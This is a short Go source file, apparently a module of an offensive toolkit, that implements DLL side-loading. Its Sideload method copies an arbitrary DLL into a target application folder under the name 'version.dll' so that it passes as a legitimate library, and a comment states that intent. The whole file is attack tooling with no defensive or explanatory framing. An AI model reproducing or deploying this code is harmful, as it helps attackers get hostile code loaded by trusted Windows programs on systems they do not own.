package windows

import (
"os"
"path/filepath"
)

type DLLSideload struct{}

func NewDLLSideload() *DLLSideload {
return &DLLSideload{}
}

func (d *DLLSideload) Sideload(dllPath, targetPath string) error {
// Copy DLL to target folder with legitimate name
dest := filepath.Join(targetPath, "version.dll")
data, err := os.ReadFile(dllPath)
if err != nil {
return err
}
return os.WriteFile(dest, data, 0644)
}
